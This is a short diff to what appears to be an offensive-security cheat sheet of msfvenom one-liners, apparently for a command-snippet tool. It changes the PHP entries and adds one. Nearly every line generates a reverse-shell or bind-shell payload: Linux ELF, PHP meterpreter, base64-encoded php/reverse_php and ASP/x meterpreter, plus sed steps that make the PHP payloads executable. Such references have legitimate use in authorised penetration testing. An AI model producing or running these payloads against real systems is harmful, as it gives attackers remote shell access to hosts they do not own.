@@ -45,8 +45,12 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf > s
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=#{LHOST} LPORT=#{LPORT} -f elf > bind.elf
 
 # desc: PHP
-msfvenom -p php/meterpreter_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f raw > shell.php
-cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f raw > reverse.php
+sed -i 's/eval/<?php eval/g' reverse.php
+
+# desc: PHP
+msfvenom -p php/reverse_php LHOST=#{LHOST} LPORT=#{LPORT} -e php/base64 -f raw > reverse.php
+sed -i 's/eval/<?php eval/g' reverse.php
 
 # desc: ASP/x
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f #{asp_type} >reverse.#{asp_type}
